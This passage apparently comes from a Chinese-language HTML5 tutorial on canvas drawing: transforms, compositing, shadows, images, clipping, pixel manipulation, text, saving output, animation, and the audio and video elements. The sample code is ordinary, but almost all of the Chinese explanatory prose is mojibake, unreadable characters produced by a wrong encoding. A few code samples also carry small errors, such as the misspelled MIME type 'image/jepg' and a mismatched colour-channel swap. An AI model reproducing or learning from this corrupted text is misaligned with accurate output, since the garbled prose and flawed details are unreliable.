g2.addColorStop(0.1, 'rgb(255,0,0,0.5)'); g2.addColorStop(0.7, 'rgb(255,255,0,0.5)'); g2.addColorStop(1, 'rgb(0,0,255,0.5)'); for (let i = 0; i &lt; 10; i++) &#123; context.beginPath(); context.fillStyle = g2; context.arc(i * 25, i * 25, i * 10, 0, Math.PI * 2, true); context.closePath(); context.fill(); &#125;&#125; ç»˜åˆ¶å˜å½¢å›¾å½¢åæ ‡å˜æ¢ä¸»è¦æœ‰ä¸‰ç§å½¢å¼ï¼š å¹³ç§»ï¼Œä½¿ç”¨å›¾å½¢ä¸Šä¸‹æ–‡çš„ translateæ–¹æ³•æ¥ç§»åŠ¨å›¾å½¢åæ ‡è½´åŽŸç‚¹ã€‚ 1context.translate(x,y); æ‰©å¤§ï¼Œä½¿ç”¨å¯¹è±¡çš„ scaleæ–¹æ³•å°†å›¾å½¢æ”¾å¤§ 1context.scale(x,y) æ—‹è½¬ï¼Œä½¿ç”¨ rotateæ–¹æ³•å°†å›¾å½¢è¿›è¡Œæ—‹è½¬ 1context.rotate(angle); æ—‹è½¬ä¸­è¥¿æ˜¯åæ ‡è½´çš„åŽŸç‚¹ï¼Œé¡ºæ—¶é’ˆæ–¹æ³• 12345678910111213141516function drawDeformationGraphics(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300); // æ”¹å˜åœ†å¿ƒä½ç½® context.translate(200, 50); context.fillStyle = 'rgba(255,0,0,0.25)'; for (let i = 0; i &lt; 50; i++) &#123; context.translate(25, 25); context.scale(0.95, 0.95); context.rotate(Math.PI / 10); context.fillRect(0, 0, 100, 50); &#125;&#125; ä¸Šé¢çš„ä»£ç ä½¿ç”¨åæ ‡å˜æ¢çš„æ–¹æ³•ã€‚é¦–å…ˆç»˜åˆ¶äº†ä¸€ä¸ªé•¿æ–¹å½¢ï¼Œç„¶åŽåœ¨ä¸€ä¸ªå¾ªçŽ¯ä¸­åå¤ä½¿ç”¨å¹³ç§»åæ ‡è½´ï¼Œå›¾å½¢ç¼©å°ï¼Œå›¾å½¢æ—‹è½¬ä¸‰ç§æŠ€å·§ç»˜åˆ¶å‡ºæ¥å˜å½¢å›¾å½¢ã€‚ ä¸Žè·¯å¾„ç»“åˆä½¿ç”¨1234567891011121314151617181920212223242526272829303132function drawDeformationGraphicsWithFivePointedStar(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300); context.translate(200, 50); context.fillStyle = 'rgba(255,0,0,0.25)'; for (let i = 0; i &lt; 50; i++) &#123; context.translate(25, 25); context.scale(0.95, 0.95); context.rotate(Math.PI / 10); createFivePointedStar(context); context.fill(); &#125;&#125;function createFivePointedStar(context) &#123; context.beginPath(); context.fillStyle = 'rgba(255,0,0,0.5)'; const dx = 100; const dy = 0; const s = 50; let dig = Math.PI / 5 * 4; for (let i = 0; i &lt; 5; i++) &#123; let x = Math.sin(i * dig); let y = Math.cos(i * dig); context.lineTo(dx + x * s, dy + y * s); &#125; context.closePath();&#125; çŸ©é˜µå˜æ¢å½“å›¾å½¢ä¸Šä¸‹æ–‡è¢«åˆ›å»ºå®Œæ¯•æ—¶ï¼Œäº‹å®žä¸Šä¹Ÿåˆ›å»ºäº†ä¸€ä¸ªé»˜è®¤çš„å˜æ¢çŸ©é˜µï¼Œå¦‚æžœä¸å¯¹è¿™ä¸ªå˜æ¢çŸ©é˜µè¿›è¡Œä¿®æ”¹ï¼Œç»˜åˆ¶çš„å›¾å½¢å°†ä»¥ç”»å¸ƒçš„æœ€å·¦ä¸Šè§’ä¸ºåæ ‡åŽŸç‚¹ç»˜åˆ¶å›¾å½¢ï¼Œç»˜åˆ¶å‡ºæ¥çš„å›¾å½¢ä¹Ÿä¸ç»è¿‡ç¼©æ”¾ã€å˜å½¢çš„å¤„ç†ã€‚æˆ‘ä»¬å¯ä»¥å¯¹è¿™ä¸ªå˜æ¢çŸ©å½¢è¿›è¡Œä¿®æ”¹ 1context.transform(a , b , c , d , e , f ) å‚æ•° æè¿° a æ°´å¹³ç¼©æ”¾ç»˜å›¾ b æ°´å¹³å€¾æ–œç»˜å›¾ c åž‚ç›´å€¾æ–œç»˜å›¾ d åž‚ç›´ç¼©æ”¾ç»˜å›¾ e æ°´å¹³ç§»åŠ¨ç»˜å›¾ f åž‚ç›´ç§»åŠ¨ç»˜å›¾ 12345678910111213141516function drawTransform(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); const colors = ['red', 'orange', 'yellow', 'green', 'blue', 'navy', 'purple']; context.lineWidth = 10; context.transform(1, 0, 0, 1, 100, 0); for (let i = 0; i &lt; colors.length; i++) &#123; // å®šä¹‰æ¯æ¬¡å‘ä¸‹ç§»åŠ¨ 10ä¸ªåƒç´ çš„å˜æ¢çŸ©é˜µ context.transform(1, 0, 0, 1, 0, 10); context.strokeStyle = colors[i]; context.beginPath(); context.arc(50, 100, 100, 0, Math.PI, true); context.stroke(); &#125;&#125; setTransform ä¼šå°†å˜æ¢çŸ©é˜µé‡ç½® 1setTransform(m11,m12,m21,m22,dx,dy) 1234567891011121314151617181920function drawSetTransform(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.strokeStyle = 'red'; context.strokeRect(30, 10, 60, 20); let rad = 45 * Math.PI / 180; context.setTransform(Math.cos(rad), Math.sin(rad), -Math.sin(rad), Math.cos(rad), 0, 0); context.strokeStyle = 'blue'; context.strokeRect(30, 10, 60, 20); context.setTransform(2.5, 0, 0, 2.5, 0, 0); context.strokeStyle = 'green'; context.strokeRect(30, 10, 60, 20); context.setTransform(1, 0, 0, 1, 40, 80); context.strokeStyle = 'gray'; context.strokeRect(30, 10, 60, 20);&#125; å›¾å½¢ç»„åˆè®¾å®šå›¾å½¢ä¸Šä¸‹æ–‡å¯¹è±¡çš„ globalCompositeOperationå±žæ€§èƒ½è‡ªå·±å†³å®šå›¾å½¢çš„ç»„åˆæ–¹å¼ 1context.globalCompositeOperation = type type çš„å€¼å¿…é¡»æ˜¯ä¸‹é¢å‡ ç§å­—ç¬¦ä¸²ä¹‹ä¸€ï¼š source-over(é»˜è®¤å€¼) è¡¨ç¤ºæ–°å›¾å½¢è¦†ç›–æ‚åŽŸæœ‰å›¾å½¢ä¸Š destination-over è¡¨ç¤ºåœ¨åŽŸæœ‰å›¾å½¢ä¹‹ä¸‹ç»˜åˆ¶æ–°å›¾å½¢ source-in æ–°å›¾å½¢ä¸ŽåŽŸæœ‰å›¾å½¢ä½œ in è¿ç®—ï¼Œåªæ˜¾ç¤ºæ–°å›¾å½¢ä¸­ä¸ŽåŽŸæœ‰å›¾åƒç›¸äº’é‡å çš„éƒ¨åˆ†ï¼Œæ–°å›¾å½¢ä¸ŽåŽŸæœ‰å›¾å½¢çš„å…¶ä»–éƒ¨åˆ†å‡å˜æˆé€æ˜Ž destination-in åŽŸæœ‰å›¾å½¢ä¸Žæ–°å›¾å½¢ä½œ in è¿ç®—ï¼Œåªæ˜¾ç¤ºåŽŸæœ‰å›¾å½¢ä¸­ä¸Žæ–°å›¾å½¢ç›¸é‡å çš„éƒ¨åˆ†ï¼Œæ–°å›¾å½¢ä¸ŽåŽŸæœ‰å›¾å½¢çš„å…¶ä»–éƒ¨åˆ†å‡å˜æˆé€æ˜Ž source-out æ–°å›¾å½¢ä¸ŽåŽŸæœ‰å›¾å½¢ out è¿ç®—ã€‚åªæ˜¾ç¤ºæ–°å›¾å½¢ä¸­ä¸ŽåŽŸæœ‰å›¾å½¢ä¸é‡å çš„éƒ¨åˆ†ï¼Œæ–°å›¾å½¢ä¸ŽåŽŸæœ‰å›¾å½¢çš„å…¶ä»–éƒ¨åˆ†å˜æˆé€æ˜Ž destination-out æ–°å›¾å½¢ä¸ŽåŽŸæœ‰å›¾å½¢ out è¿ç®—ã€‚åªæ˜¾ç¤ºåŽŸæœ‰å›¾å½¢ä¸­ä¸Žæ–°å›¾å½¢ä¸é‡å çš„éƒ¨åˆ†ï¼ŒåŽŸæœ‰å›¾å½¢ä¸Žæ–°å›¾å½¢çš„å…¶ä»–éƒ¨åˆ†å˜æˆé€æ˜Ž source-atop åªç»˜åˆ¶æ–°å›¾å½¢ä¸­ä¸ŽåŽŸæœ‰å›¾å½¢é‡å çš„éƒ¨åˆ†ä¸Žæœªè¢«é‡å è¦†ç›–çš„åŽŸæœ‰å›¾å½¢ï¼Œæ–°å›¾å½¢çš„å…¶ä»–éƒ¨åˆ†å˜æˆé€æ˜Ž destination-atop åªç»˜åˆ¶åŽŸæœ‰å›¾å½¢ä¸­è¢«æ–°å›¾å½¢é‡å è¦†ç›–çš„éƒ¨åˆ†ä¸Žæ–°å›¾å½¢çš„å…¶ä»–éƒ¨åˆ†ï¼ŒåŽŸæœ‰å›¾å½¢ä¸­çš„å…¶ä»–éƒ¨åˆ†å˜æˆé€æ˜Žï¼Œä¸ç»˜åˆ¶æ–°å›¾å½¢ä¸­ä¸ŽåŽŸæœ‰å›¾å½¢ç›¸é‡å çš„éƒ¨åˆ† lighter åŽŸæœ‰å›¾å½¢ä¸Žæ–°å›¾å½¢å‡ç»˜åˆ¶ï¼Œé‡å éƒ¨åˆ†åšåŠ è‰²å¤„ç† xor åªç»˜åˆ¶æ–°å›¾å½¢ä¸­ä¸ŽåŽŸæœ‰å›¾å½¢ä¸é‡å çš„éƒ¨åˆ†ï¼Œé‡å éƒ¨åˆ†å˜æˆé€æ˜Ž copy åªç»˜åˆ¶æ–°å›¾å½¢ï¼ŒåŽŸæœ‰å›¾å½¢ä¸­æœªä¸Žæ–°å›¾å½¢é‡å çš„éƒ¨åˆ†å˜æˆé€æ˜Ž ç»™å›¾å½¢ç»˜åˆ¶é˜´å½± shadowOffsetXâ€”â€”é˜´å½±çš„æ¨ªçº¿ä½ç§»é‡ shadowOffsetYâ€”â€”é˜´å½±çš„çºµå‘ä½ç§»é‡ shadowColorâ€”â€”é˜´å½±çš„é¢œè‰² shadowBlurâ€”â€”é˜´å½±çš„æ¨¡ç³ŠèŒƒå›´ 1234567891011121314151617function drawShadowFifthStar(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300); context.shadowOffsetX = 10; context.shadowOffsetY = 10; context.shadowColor = 'rgba(100,100,100,0.5)'; context.shadowBlur = 7.5; context.translate(0, 50); for (let i = 0; i &lt; 3; i++) &#123; context.translate(50, 50); createFivePointedStar(context); context.fill(); &#125;&#125; ä½¿ç”¨å›¾åƒç»˜åˆ¶å›¾åƒ12345678// å®½é«˜ ä¸ºåŽŸå›¾åƒå®½é«˜context.drawImage(image,x,y);// å¢žåŠ å®½é«˜çš„è‡ªå®šä¹‰context.drawImage(image,x,y,w,h)// å°†ç”»å¸ƒä¸­ç»˜åˆ¶å¥½çš„å›¾åƒçš„å…¨éƒ¨æˆ–è€…éƒ¨åˆ†å¤åˆ¶åˆ°ç”»å¸ƒçš„å¦ä¸€ä¸ªä½ç½®ä¸Šcontext.drawImage(image,sx,sy,sw,sh,dx,dy,dw,dh) 1234567891011121314151617181920212223function drawCanvasImage(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300) image = new Image(); image.src = '../Desktop/å¾®ä¿¡å›¾ç‰‡_20190311090059.jpg' image.onload = function () &#123; drawBigImage(context, image) &#125;&#125;function drawImage(context, image) &#123; for (let i = 0; i &lt; 7; i++) &#123; context.drawImage(image, 0 + i * 50, 0 + i * 25, 100, 100); &#125;&#125;function drawBigImage(context, image) &#123; context.drawImage(image, 0, 0, 100, 100); context.drawImage(image, 23, 5, 57, 80, 110, 0, 100, 100);&#125; å›¾åƒå¹³é“º12345678910111213function drawTileImage(canvas, context, image) &#123; console.log(canvas); const scale = 5; let n1 = image.width / scale; let n2 = image.height / scale; let n3 = canvas.width / n1; let n4 = canvas.height / n2; for (let i = 0; i &lt; n3; i++) &#123; for (let j = 0; j &lt; n4; j++) &#123; context.drawImage(image, i * n1, j * n2, n1, n2); &#125; &#125;&#125; ä¸Šé¢ä½¿ç”¨å˜é‡å’Œå¾ªçŽ¯æ¥å®žçŽ°å›¾åƒå¹³é“ºã€‚è¿˜å¯ä»¥ç”¨æ›´ç®€ä¾¿çš„å›¾å½¢ä¸Šä¸‹æ–‡çš„ createPatternæ–¹æ³•ã€‚ 1context.createPattern(image,type) image å‚æ•°ä¸ºè¦å¹³é“ºçš„å›¾åƒï¼Œtype å‚æ•°ï¼š no-repeatï¼šä¸å¹³é“º repeat-xï¼šæ¨ªæ–¹å‘å¹³é“º repeat-yï¼šçºµæ–¹å‘å¹³é“º repeatï¼šå…¨æ–¹å‘å¹³é“º 123456789101112131415161718192021function drawCanvasImage(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300) image = new Image(); image.src = '../Desktop/å¾®ä¿¡å›¾ç‰‡_20190311090059.jpg'; image.width = 10; image.onload = function () &#123; const canvasTemp = document.createElement('canvas'); const contextTemp = canvasTemp.getContext('2d'); canvasTemp.width = 100; canvasTemp.height = 100; contextTemp.drawImage(this,0,0,100,100); let ptrn = context.createPattern(canvasTemp,'repeat'); // context.drawImage(image, 23, 5, 57, 80); context.fillStyle = ptrn; context.fillRect(0, 0, 400, 300) &#125;&#125; å½“å›¾åƒå¤ªå¤§çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡æŠŠå›¾åƒç»˜åˆ¶åœ¨ä¸€ä¸ªä¸´æ—¶çš„ canvas é‡Œé¢ï¼Œç„¶åŽå†ç”¨ä¸»canvas é‡å¤è¿™ä¸ªä¸´æ—¶ canvas å›¾åƒè£å‰ªä½¿ç”¨ clip æ–¹æ³•è®¾ç½®è£å‰ªåŒºåŸŸ 123456789101112131415161718192021222324252627282930313233function cutImage(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); const gr = context.createLinearGradient(0, 400, 300, 0); gr.addColorStop(0, 'rgb(255,255,0)'); gr.addColorStop(1, 'rgb(0,255,255)'); context.fillStyle = gr; context.fillRect(0, 0, 400, 300); image = new Image(); image.src = '../Desktop/å¾®ä¿¡å›¾ç‰‡_20190311090059.jpg'; image.onload = function () &#123; createFivePointedStar(context); context.drawImage(image, -50, -150, 400, 300); &#125;&#125;function createFivePointedStar(context) &#123; context.beginPath(); context.translate(100,150); context.fillStyle = 'rgba(255,0,0,0.5)'; const dx = 100; const dy = 0; const s = 50; let dig = Math.PI / 5 * 4; for (let i = 0; i &lt; 5; i++) &#123; let x = Math.sin(i * dig); let y = Math.cos(i * dig); context.lineTo(dx + x * s, dy + y * s); &#125; context.closePath(); context.clip();&#125; åƒç´ å¤„ç†ä½¿ç”¨ getImageData æ–¹æ³•å¯ä»¥èŽ·å–å›¾åƒä¸­çš„åƒç´ ,èŽ·å¾—åƒç´ ç»„ä¾æ¬¡ rgba å€¼ã€‚ 1imageData = context.getImageData(x,y,width,height); å‚æ•° æè¿° x å¼€å§‹å¤åˆ¶çš„å·¦ä¸Šè§’ä½ç½®çš„ x åæ ‡ã€‚ y å¼€å§‹å¤åˆ¶çš„å·¦ä¸Šè§’ä½ç½®çš„ y åæ ‡ã€‚ width å°†è¦å¤åˆ¶çš„çŸ©å½¢åŒºåŸŸçš„å®½åº¦ã€‚ height å°†è¦å¤åˆ¶çš„çŸ©å½¢åŒºåŸŸçš„é«˜åº¦ã€‚ å¯¹äºŽ ImageData å¯¹è±¡ä¸­çš„æ¯ä¸ªåƒç´ ï¼Œéƒ½å­˜åœ¨ç€å››æ–¹é¢çš„ä¿¡æ¯ï¼Œå³ RGBA å€¼ï¼š R - çº¢è‰² (0-255) G - ç»¿è‰² (0-255) B - è“è‰² (0-255) A - alpha é€šé“ (0-255; 0 æ˜¯é€æ˜Žçš„ï¼Œ255 æ˜¯å®Œå…¨å¯è§çš„) åˆ©ç”¨ putImageData å°†å›¾åƒæ•°æ®æ”¾å›žç”»å¸ƒ,æœŸé—´åšä¸€äº›é¢œè‰²å¤„ç†ï¼Œå¯ä»¥æ¨¡æ‹Ÿæ»¤é•œã€‚ 1234567891011image.onload = function () &#123; // createFivePointedStar(context); context.drawImage(image, 0, 0, 400, 300); let imagedata = context.getImageData(0, 0, image.width, image.height) for (let i = 0, n = imagedata.data.length; i &lt; n; i += 4) &#123; imagedata.data[i + 0] = 255 - imagedata.data[i + 0]; imagedata.data[i + 1] = 255 - imagedata.data[i + 2]; imagedata.data[i + 2] = 255 - imagedata.data[i + 1]; &#125; context.putImageData(imagedata, 0, 0, 400, 300);&#125; 1context.putImageData(imgData,x,y,dirtyX,dirtyY,dirtyWidth,dirtyHeight); å‚æ•° æè¿° imgData è§„å®šè¦æ”¾å›žç”»å¸ƒçš„ ImageData å¯¹è±¡ã€‚ x ImageData å¯¹è±¡å·¦ä¸Šè§’çš„ x åæ ‡ï¼Œä»¥åƒç´ è®¡ã€‚ y ImageData å¯¹è±¡å·¦ä¸Šè§’çš„ y åæ ‡ï¼Œä»¥åƒç´ è®¡ã€‚ dirtyX å¯é€‰ã€‚æ°´å¹³å€¼ï¼ˆxï¼‰ï¼Œä»¥åƒç´ è®¡ï¼Œåœ¨ç”»å¸ƒä¸Šæ”¾ç½®å›¾åƒçš„ä½ç½®ã€‚ dirtyY å¯é€‰ã€‚æ°´å¹³å€¼ï¼ˆyï¼‰ï¼Œä»¥åƒç´ è®¡ï¼Œåœ¨ç”»å¸ƒä¸Šæ”¾ç½®å›¾åƒçš„ä½ç½®ã€‚ dirtyWidth å¯é€‰ã€‚åœ¨ç”»å¸ƒä¸Šç»˜åˆ¶å›¾åƒæ‰€ä½¿ç”¨çš„å®½åº¦ã€‚ dirtyHeight å¯é€‰ã€‚åœ¨ç”»å¸ƒä¸Šç»˜åˆ¶å›¾åƒæ‰€ä½¿ç”¨çš„é«˜åº¦ã€‚ ç»˜åˆ¶æ–‡å­—fillText å¡«å……æ–¹å¼ç»˜åˆ¶å­—ç¬¦ä¸² 1context.fillText(text,x,y,maxWidth); maxWidthï¼Œå…è®¸æœ€å¤§çš„å®½åº¦ï¼Œåƒç´ å•ä½ strokeText ç”¨è½®å»“æ–¹å¼ç»˜åˆ¶å­—ç¬¦ä¸² 1context.strokeText(text,x,y,maxWidth); ä¸€äº›å…³äºŽæ–‡å­—ç»˜åˆ¶çš„å±žæ€§ï¼š fontï¼šå­—ä½“ textAlignï¼šæ°´å¹³å¯¹é½æ–¹å¼ï¼Œstart(é»˜è®¤)ã€endã€leftã€rightã€center textBaselineï¼šåž‚ç›´å¯¹é½æ–¹å¼ï¼Œtopã€hangingã€middleã€alphabetic(é»˜è®¤)ã€ideographicã€bottom èŽ·å¾—æ–‡å­—çš„å®½åº¦ 1context.measureText(text) æŽ¥å—ä¸€ä¸ªå‚æ•° textï¼Œè¯¥å‚æ•°ä¸ºéœ€è¦ç»˜åˆ¶çš„æ–‡å­—ï¼Œè¿”å›žä¸€ä¸ª TextMetrics å¯¹è±¡ï¼ŒTextMetricså¯¹è±¡çš„ width å±žæ€§è¡¨ç¤ºä½¿ç”¨å½“å‰æŒ‡å®šçš„æ–‡å­—åŽ text å‚æ•°ä¸­æŒ‡å®šçš„æ–‡å­—çš„æ€»æ–‡å­—å®½åº¦ 1234567891011121314function drawText(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.font = 'italic 20px sans-serif'; let txt = 'å­—ç¬¦ä¸²çš„å®½åº¦ä¸ºï¼š'; let tml = context.measureText(txt); context.fillText(txt, 10, 30); context.fillText(tml.width, tml.width + 10, 30); context.font = 'bold 30px sans-serif'; let tm2 = context.measureText(txt); context.fillText(txt, 10, 70); context.fillText(tm2.width, tm2.width + 10, 70);&#125; å…¶ä»–ä¿å­˜ä¸Žæ¢å¤çŠ¶æ€1234// å°†å½“å‰çŠ¶æ€ä¿å­˜åˆ° æ ˆä¸­context.save();// ä»Žæ ˆä¸­å–å‡ºä¹‹å‰ä¿å­˜çš„å›¾å½¢ä¸Šä¸‹æ–‡çš„çŠ¶æ€è¿›è¡Œæ¢å¤ context.restore(); ç»˜ç”»çŠ¶æ€åŒ…æ‹¬åæ ‡çš„åŽŸç‚¹ã€å˜å½¢æ—¶çš„å˜æ¢çŸ©é˜µï¼Œå›¾å½¢ä¸Šä¸‹æ–‡å¯¹è±¡çš„å½“å‰å±žæ€§å€¼ã€‚ å¯ä»¥åº”ç”¨åœ¨ä¸‹é¢ä½†ä¸ä»…ä»…ä¸‹é¢çš„åœºæ™¯ï¼š å›¾åƒæˆ–å›¾å½¢å˜å½¢ å›¾åƒè£å‰ª æ”¹å˜å›¾å½¢ä¸Šä¸‹æ–‡çš„ä»¥ä¸‹å±žæ€§çš„æ—¶å€™ï¼šfillStyleã€fontã€globalAlphaã€globalCompositeã€Operationã€lineCapã€lineJoinã€lineWidthã€miterLimitã€shadowBlurã€shadowColorã€shadowOffsetXã€shadowOffsetYã€strokeStyleã€textAlignã€textBaseline ä¿å­˜æ–‡ä»¶ åŽŸç†å®žé™…ä¸Šæ˜¯æŠŠå½“å‰çš„ç»˜ç”»çŠ¶æ€è¾“å‡ºåˆ°ä¸€ä¸ª data URL åœ°å€æ‰€æŒ‡å‘çš„æ•°æ®ä¸­çš„è¿‡ç¨‹ã€‚data URLæŒ‡çš„æ˜¯ç›®å‰å¤§éƒ¨åˆ†æµè§ˆå™¨èƒ½å¤Ÿè¯†åˆ«çš„ä¸€ç§ base64ç¼–ç çš„ URLï¼Œä¸»è¦ç”¨äºŽå°åž‹çš„ã€å¯ä»¥åœ¨ç½‘é¡µä¸­ç›´æŽ¥åµŒå…¥çš„ï¼Œè€Œä¸éœ€è¦ä»Žå¤–éƒ¨æ–‡ä»¶åµŒå…¥çš„æ•°æ®ï¼Œä¾‹å¦‚ img å…ƒç´ ä¸­çš„å›¾åƒæ–‡ä»¶ç­‰ã€‚ toDataURL æ–¹æ³•æŠŠç»˜ç”»çŠ¶æ€è¾“å‡ºåˆ°ä¸€ä¸ª data URLä¸­ï¼Œç„¶åŽé‡æ–°è£…è½½ï¼Œå®¢æˆ·å¯ä»¥ç›´æŽ¥æŠŠè£…è½½åŽçš„æ–‡ä»¶è¿›è¡Œä¿å­˜ã€‚ 12canvas.toDataURL(type);// type è¡¨ç¤ºè¾“å‡ºè¾“å‡ºç±»åž‹çš„ MIME ç±»åž‹ 12345678910function drawDataURL(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = 'rgb(0,0,255)'; context.fillRect(0, 0, canvas.width, canvas.height); context.fillStyle = 'rgb(255,255,0)'; context.fillRect(10, 20, 50, 50); console.log(canvas.toDataURL("image/jepg"))&#125; ç®€å•åŠ¨ç”»çš„åˆ¶ä½œcanvas ç”»å¸ƒä¸­åˆ¶ä½œçš„åŠ¨ç”»å®žé™…ä¸Šå°±æ˜¯ä¸€ä¸ªä¸æ–­æ“¦é™¤ï¼ˆclearRectï¼‰ã€é‡ç»˜çš„è¿‡ç¨‹ã€‚ 12345678910111213141516function animationOnCanvas(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; context = canvas.getContext('2d'); width = canvas.width; height = canvas.height; i = 0; setInterval(rotate, 100);&#125;function rotate() &#123; context.clearRect(0, 0, width, height); context.fillStyle = 'red'; context.fillRect(i, 0, 20, 20); i += 20;&#125; å¤šåª’ä½“æ’­æ”¾å…³äºŽ video ä¸Ž audioå…ƒç´ HTML4é¡µé¢ä¸­æ’­æ”¾è§†é¢‘æˆ–è€…éŸ³é¢‘æ•°æ® 1234567891011&lt;object classid="clsid:F08DF954-8592-11D1-B16A-00C0F0283628" id="Slider1" width="100" height="50"&gt; &lt;param name="BorderStyle" value="1" /&gt; &lt;param name="MousePointer" value="0" /&gt; &lt;param name="Enabled" value="1" /&gt; &lt;param name="Min" value="0" /&gt; &lt;param name="Max" value="10" /&gt; &lt;param name="allowFullScreen" value="true" /&gt; &lt;param name="allowscriptaccess" value="always" /&gt; &lt;embed type="application/x-shockwave-flash" width="425" height="344" src="p.swf" allowscriptaccess="always" allowfullscreen="true"&gt;&lt;/embed&gt;&lt;/object&gt; å¯ä»¥çœ‹å‡ºä¸Šé¢ä»£ç çš„ä¸€äº›ç¼ºç‚¹ï¼šå†—é•¿ï¼Œéœ€è¦ä½¿ç”¨ Flash æ’ä»¶ï¼Œç”¨æˆ·æ²¡æœ‰å®‰è£…çš„è¯ï¼Œåˆ™è§†é¢‘çœ‹ä¸äº†ã€‚éœ€è¦ç»“åˆå¤šä¸ªå…ƒç´ ï¼Œå¹¶ä¸”éœ€è¦æ·»åŠ å¾ˆå¤šå±žæ€§ã€‚ HTML5 ä¸­çš„åˆ™æ˜¯ï¼š 12345678910111213&lt;audio src='xxx.mp3'&gt; æ‚¨çš„æµè§ˆå™¨å™¨ä¸æ”¯æŒ audio å…ƒç´ &lt;/audio&gt;&lt;video width="640" height="360" src='xxx.mp4'&gt; æ‚¨çš„æµè§ˆå™¨å™¨ä¸æ”¯æŒ video å…ƒç´ &lt;/video&gt;&lt;!--ç»“åˆ sourceå…ƒç´ ä¸ºåŒä¸€ä¸ªåª’ä½“æ•°æ®æŒ‡å®šå¤šä¸ªæ’­æ”¾æ ¼å¼ä¸Žç¼–ç æ–¹å¼ï¼Œæµè§ˆå™¨ä¼šä»Žä¸­æ‰¾åˆ°ä¸€ç§è‡ªå·±æ”¯æŒçš„æ’­æ”¾æ ¼å¼æ¥æ’­æ”¾ --&gt;&lt;video&gt; &lt;source src="sample.ogv" type="video/ogg";codecs="theora,vorbis"&gt; &lt;source src="sample.mov" type="video/quicktime"&gt;&lt;/video&gt;&lt;!--typeæŒ‡æ’­æ”¾åª’ä½“çš„MIMEç±»åž‹ï¼Œcodesè¡¨ç¤ºåª’ä½“çš„ç¼–ç æ ¼å¼--&gt; å±žæ€§ src æŒ‡å®šåª’ä½“æ•°æ®çš„ URL åœ°å€ autoplay æŒ‡å®šåª’ä½“æ˜¯å¦åœ¨é¡µé¢åŠ è½½åŽè‡ªåŠ¨æ’­æ”¾ preload æŒ‡å®šæ•°æ®æ˜¯å¦é¢„åŠ è½½ã€‚é¢„åŠ è½½æµè§ˆå™¨ä¼šé¢„å…ˆå°†è§†é¢‘æˆ–è€…éŸ³é¢‘æ•°æ®ç¼“å†²ï¼ŒåŠ å¿«æ’­æ”¾é€Ÿåº¦ï¼Œå› ä¸ºæ’­æ”¾æ—¶æ•°æ®å·²ç»ç¼“å†²å®Œæ¯•ã€‚è¯¥å±žæ€§æœ‰ noneï¼ˆä¸è¿›è¡Œé¢„åŠ è½½ï¼‰ã€metadataï¼ˆåªé¢„åŠ è½½åª’ä½“çš„å…ƒæ•°æ®ï¼šåª’ä½“å­—èŠ‚æ•°ã€ç¬¬ä¸€å¸§ã€æ’­æ”¾åˆ—è¡¨ã€æŒç»­æ—¶é—´ç­‰ï¼‰ã€auto(é»˜è®¤ï¼Œè¡¨ç¤ºé¢„åŠ è½½å…¨éƒ¨è§†é¢‘æˆ–è€…éŸ³é¢‘)ã€‚ poster(videoç‹¬æœ‰) å½“è§†é¢‘ä¸å¯ç”¨çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨è¯¥å…ƒç´ å‘ç”¨æˆ·å±•ç¤ºä¸€å‰¯æ›¿ä»£ç”¨çš„å›¾ç‰‡ã€‚ç”¨æˆ·ä½“éªŒè‰¯å¥½ loop å¾ªçŽ¯æ’­æ”¾ controls æ·»åŠ æµè§ˆå™¨è‡ªå¸¦çš„æ’­æ”¾ç”¨çš„æŽ§åˆ¶æ¡ï¼Œå…·æœ‰æ’­æ”¾ã€æš‚åœç­‰æŒ‰é’®ã€‚ width ä¸Ž heightï¼ˆvideoç‹¬æœ‰ï¼‰ è¯¥å±žæ€§ä¸­æŒ‡å®šè§†é¢‘çš„å®½åº¦å’Œé«˜åº¦ï¼ˆåƒç´ ï¼‰ error è¯»å–ä½¿ç”¨åª’ä½“æ•°æ®çš„è¿‡ç¨‹ä¸­å‡ºé”™çš„è¯ï¼Œè¿”å›žä¸€ä¸ª MediaErrorå¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„codeè¿”å›žå¯¹åº”çš„é”™è¯¯çŠ¶æ€ï¼Œæœ‰4ä¸ªå€¼ MEDIA_ERR_ABORTED(æ•°å­—å€¼ä¸º1)ï¼šåª’ä½“æ•°æ®çš„ä¸‹è½½è¿‡ç¨‹ç”±äºŽç”¨æˆ·æ“ä½œçš„åŽŸå› è€Œè¢«ä¸­æ­¢ MEDIA_ERR_NETWORK(æ•°å­—å€¼ä¸º2)ï¼šç¡®è®¤åª’ä½“èµ„æºå¯ç”¨ï¼Œä½†æ˜¯åœ¨ä¸‹è½½æ—¶å‡ºçŽ°ç½‘ç»œé”™è¯¯ï¼Œåª’ä½“æ•°æ®çš„ä¸‹è½½è¿‡ç¨‹è¢«ä¸­æ­¢ MEDIA_ERR_DECODE(æ•°å­—å€¼ä¸º3)ï¼šç¡®è®¤åª’ä½“èµ„æºå¯ç”¨ï¼Œä½†æ˜¯è§£ç æ—¶å‘ç”Ÿé”™è¯¯ã€‚ MEDIA_ERR_SRC_NOT_SUPPORTED(æ•°å­—å€¼ä¸º4)ï¼šåª’ä½“èµ„æºä¸å¯ç”¨åª’ä½“æ 